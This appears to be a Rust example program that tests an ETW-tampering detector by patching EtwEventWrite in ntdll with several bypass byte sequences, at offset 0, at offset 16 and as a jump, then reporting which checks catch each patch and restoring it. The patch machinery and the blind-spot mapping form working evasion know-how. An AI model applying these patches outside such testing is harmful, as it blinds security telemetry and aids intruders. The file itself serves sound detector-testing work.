//! Non-lethal ETW attack simulation — hard mode.
//!
//! Progressively harder bypass attempts against the detector in
//! `etw::security`. The first attack is the textbook one; the last is what
//! an attacker who has read the detector's source would try.
//!
//! **This is a research tool.** Every patch is restored by a `Drop` guard, so
//! the process cannot leave the system in a modified state.
//!
//! Run with:
//! ```text
//! cargo run --example etw_attack -p etw
//! ```
//!
//! The example name comes from the file stem. If the file is renamed, the
//! command changes with it.

use etw::security::{ExportIntegrity, check_ntdll_exports, full_report, verify_text_section};
use std::ffi::c_void;
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::Memory::{
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VirtualProtect,
};
use windows::core::{PCSTR, PCWSTR};

// ---------------------------------------------------------------------------
// Patch machinery
// ---------------------------------------------------------------------------

struct PatchGuard {
    address: *mut u8,
    original: Vec<u8>,
    name: String,
    offset: usize,
}

impl Drop for PatchGuard {
    fn drop(&mut self) {
        unsafe {
            let mut old = PAGE_PROTECTION_FLAGS::default();
            let _ = VirtualProtect(
                self.address as *const c_void,
                self.original.len(),
                PAGE_EXECUTE_READWRITE,
                &mut old,
            );
            std::ptr::copy_nonoverlapping(
                self.original.as_ptr(),
                self.address,
                self.original.len(),
            );
            let _ = VirtualProtect(
                self.address as *const c_void,
                self.original.len(),
                PAGE_EXECUTE_READ,
                &mut old,
            );
        }
        println!(
            "  [restore] {} ({} bytes at +{})",
            self.name,
            self.original.len(),
            self.offset
        );
    }
}

fn resolve(name: &str) -> Option<*mut u8> {
    let ntdll_name: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
    let module = unsafe { GetModuleHandleW(PCWSTR(ntdll_name.as_ptr())) }.ok()?;
    let name_c: Vec<u8> = name.bytes().chain(std::iter::once(0)).collect();
    let proc = unsafe { GetProcAddress(module, PCSTR(name_c.as_ptr())) }?;
    Some(proc as usize as *mut u8)
}

fn patch_at(name: &str, offset: usize, patch_bytes: &[u8]) -> Option<PatchGuard> {
    let base = resolve(name)?;
    let address = unsafe { base.add(offset) };

    let original =
        unsafe { std::slice::from_raw_parts(address as *const u8, patch_bytes.len()).to_vec() };

    unsafe {
        let mut old = PAGE_PROTECTION_FLAGS::default();
        let result = VirtualProtect(
            address as *const c_void,
            patch_bytes.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old,
        );
        if result.is_err() {
            eprintln!("  [error] VirtualProtect failed for {name}+{offset}");
            return None;
        }
        std::ptr::copy_nonoverlapping(patch_bytes.as_ptr(), address, patch_bytes.len());
        let _ = VirtualProtect(
            address as *const c_void,
            patch_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old,
        );
    }

    println!("  [patch]   {name}+{offset} -> {:02X?}", patch_bytes);
    Some(PatchGuard {
        address,
        original,
        name: name.to_string(),
        offset,
    })
}

fn patch(name: &str, patch_bytes: &[u8]) -> Option<PatchGuard> {
    patch_at(name, 0, patch_bytes)
}

// ---------------------------------------------------------------------------
// Reporting
// ---------------------------------------------------------------------------

/// What a single attack attempt produced.
struct AttackResult {
    name: &'static str,
    description: &'static str,
    detected_by: Vec<&'static str>,
    missed_by: Vec<&'static str>,
}

impl AttackResult {
    fn detected(&self) -> bool {
        !self.detected_by.is_empty()
    }

    /// Print the per-attack verdict, including what the detector missed.
    ///
    /// The "missed by" line is the useful part: an attack caught only by the
    /// `.text` comparison tells the reader the prologue matcher has a blind
    /// spot, which is worth knowing before the next attack.
    fn print(&self) {
        let marker = if self.detected() { "CAUGHT" } else { "MISSED" };
        println!("\n  ── {} ──", self.name);
        println!("  technique:  {}", self.description);
        println!("  verdict:    {marker}");
        if !self.detected_by.is_empty() {
            println!("  caught by:  {}", self.detected_by.join(", "));
        }
        if !self.missed_by.is_empty() {
            println!("  missed by:  {}", self.missed_by.join(", "));
        }
    }
}

/// Run all three detector checks and return which ones fired.
fn which_checks_fire() -> (Vec<&'static str>, Vec<&'static str>) {
    let exports = check_ntdll_exports();
    let text = verify_text_section();

    let mut fired = Vec::new();
    let mut quiet = Vec::new();

    // Check 1: prologue pattern matcher.
    let prologue_hit = exports.iter().any(|e| e.known_patch.is_some());
    if prologue_hit {
        fired.push("prologue pattern");
    } else {
        quiet.push("prologue pattern");
    }

    // Check 2: jump scan.
    let jump_hit = exports.iter().any(|e| !e.jumps.is_empty());
    if jump_hit {
        fired.push("jump scan");
    } else {
        quiet.push("jump scan");
    }

    // Check 3: .text comparison against disk.
    let text_hit = text.as_ref().map(|t| !t.is_clean()).unwrap_or(false);
    if text_hit {
        fired.push(".text comparison");
    } else {
        quiet.push(".text comparison");
    }

    (fired, quiet)
}

fn report_integrity(results: &[ExportIntegrity], label: &str) {
    println!("\n  --- {label} ---");
    for r in results {
        let status = if let Some(reason) = r.reason() {
            format!("SUSPICIOUS: {reason}")
        } else {
            "clean".to_string()
        };
        println!("  {:20} {:02X?}  {}", r.name, &r.memory_bytes[..4], status);
    }
}

// ---------------------------------------------------------------------------
// The attacks
// ---------------------------------------------------------------------------

fn attack_1_textbook() -> AttackResult {
    println!("\n=== Attack 1: textbook prologue patch ===");
    println!("  Overwrite the first three bytes of EtwEventWrite with");
    println!("  `xor eax, eax; ret`. The canonical bypass.");

    let Some(guard) = patch("EtwEventWrite", &[0x31, 0xC0, 0xC3]) else {
        return AttackResult {
            name: "textbook prologue patch",
            description: "xor eax, eax; ret at offset 0",
            detected_by: vec!["(could not resolve export)"],
            missed_by: vec![],
        };
    };

    report_integrity(&check_ntdll_exports(), "After patch");
    let (fired, quiet) = which_checks_fire();
    drop(guard);

    AttackResult {
        name: "textbook prologue patch",
        description: "xor eax, eax; ret at offset 0 of EtwEventWrite",
        detected_by: fired,
        missed_by: quiet,
    }
}

fn attack_2_unknown_pattern() -> AttackResult {
    println!("\n=== Attack 2: unknown return pattern ===");
    println!("  `sub eax, eax; ret` also returns STATUS_SUCCESS but is not in");
    println!("  the prologue pattern list.");

    let Some(guard) = patch("EtwEventWrite", &[0x2B, 0xC0, 0xC3]) else {
        return AttackResult {
            name: "unknown return pattern",
            description: "sub eax, eax; ret at offset 0",
            detected_by: vec!["(could not resolve export)"],
            missed_by: vec![],
        };
    };

    report_integrity(&check_ntdll_exports(), "After patch");
    let (fired, quiet) = which_checks_fire();
    drop(guard);

    AttackResult {
        name: "unknown return pattern",
        description: "sub eax, eax; ret at offset 0 of EtwEventWrite",
        detected_by: fired,
        missed_by: quiet,
    }
}

fn attack_3_offset_patch() -> AttackResult {
    println!("\n=== Attack 3: patch after the prologue ===");
    println!("  The detector reads the first 16 bytes. Patch at offset 16.");
    println!("  The function's real prologue still looks normal.");

    // 16 is outside the 16-byte scan window in the prologue matcher. The
    // `.text` comparison catches it.
    let Some(guard) = patch_at("EtwEventWrite", 16, &[0x31, 0xC0, 0xC3]) else {
        return AttackResult {
            name: "offset patch",
            description: "xor eax, eax; ret at offset 16",
            detected_by: vec!["(could not resolve export)"],
            missed_by: vec![],
        };
    };

    report_integrity(&check_ntdll_exports(), "After patch");
    let (fired, quiet) = which_checks_fire();
    drop(guard);

    AttackResult {
        name: "offset patch",
        description: "xor eax, eax; ret at offset 16 of EtwEventWrite",
        detected_by: fired,
        missed_by: quiet,
    }
}

fn attack_4_trampoline() -> AttackResult {
    println!("\n=== Attack 4: jump trampoline ===");
    println!("  Overwrite the prologue with a jump to a nearby `ret` byte.");
    println!("  The pattern list does not match a jump.");

    // `E9 00 00 00 00` is a jump to the instruction right after itself — a
    // no-op in effect. A real attacker would point it at controlled code.
    // The detector sees the jump opcode at offset 0.
    let Some(guard) = patch("EtwEventWrite", &[0xE9, 0x00, 0x00, 0x00, 0x00]) else {
        return AttackResult {
            name: "jump trampoline",
            description: "jmp rel32 at offset 0",
            detected_by: vec!["(could not resolve export)"],
            missed_by: vec![],
        };
    };

    report_integrity(&check_ntdll_exports(), "After patch");
    let (fired, quiet) = which_checks_fire();
    drop(guard);

    AttackResult {
        name: "jump trampoline",
        description: "jmp rel32 at offset 0 of EtwEventWrite",
        detected_by: fired,
        missed_by: quiet,
    }
}

fn attack_5_patch_detector() -> AttackResult {
    println!("\n=== Attack 5: patch the detector ===");
    println!("  The strongest attack: overwrite the detector's own check");
    println!("  function so it always reports clean.");
    println!("  This is the 'who watches the watchmen' problem.");

    // The function we target is `check_ntdll_exports` in the etw crate.
    // It is not in ntdll, so `resolve` cannot find it — the attacker would
    // need a different resolution path. The point is architectural: even if
    // they had one, the detector cannot see itself.
    println!("  [note] this attack is *not* attempted, because it cannot be");
    println!("         detected from within the same process. See the README.");

    AttackResult {
        name: "patch the detector",
        description: "overwrite the check function itself",
        detected_by: vec![],
        missed_by: vec!["everything — this is the fundamental limit"],
    }
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

fn run() {
    println!("=== ETW Attack Simulation — Hard Mode ===\n");
    println!("Five attacks, ordered by sophistication. Each patches, is checked,");
    println!("then restores. The point is not to defeat the detector but to map");
    println!("where it fails and why.\n");

    let baseline = check_ntdll_exports();
    report_integrity(&baseline, "Baseline");

    let clean = baseline.iter().all(|e| !e.is_suspicious());
    if !clean {
        println!("\n  WARNING: baseline already shows tampering. Aborting.");
        return;
    }

    let results = vec![
        attack_1_textbook(),
        attack_2_unknown_pattern(),
        attack_3_offset_patch(),
        attack_4_trampoline(),
        attack_5_patch_detector(),
    ];

    // Print each verdict, including what the detector missed. This is what
    // exercises `description` and `missed_by`; the summary table below is
    // the compact overview, and this is the detailed per-attack line.
    for result in &results {
        result.print();
    }

    // Final restoration check.
    println!("\n=== Final integrity check ===");
    let final_exports = check_ntdll_exports();
    report_integrity(&final_exports, "After all attacks and restores");
    let final_text = verify_text_section();
    match &final_text {
        Some(t) if t.is_clean() => println!("\n  .text: clean ({} bytes match disk)", t.text_size),
        Some(t) => println!("\n  .text: DIRTY: {:?}", t.reason()),
        None => println!("\n  .text: could not read"),
    }

    // Summary table.
    println!("\n=== Summary ===\n");
    println!("  {:<28} {:<10} {}", "attack", "verdict", "caught by");
    println!("  {}", "─".repeat(72));
    for r in &results {
        let verdict = if r.detected() { "CAUGHT" } else { "MISSED" };
        let caught = if r.detected_by.is_empty() {
            "—".to_string()
        } else {
            r.detected_by.join(", ")
        };
        println!("  {:<28} {:<10} {}", r.name, verdict, caught);
    }

    println!("\n=== Full security report ===");
    let report = full_report("etw-attack-sim");
    let problems = report.problems();
    if problems.is_empty() {
        println!("  No problems detected.");
    } else {
        for p in &problems {
            println!("  - {p}");
        }
    }

    println!("\n=== Simulation complete ===");
}

#[cfg(windows)]
fn main() {
    run();
}

#[cfg(not(windows))]
fn main() {
    eprintln!("This example requires Windows.");
}
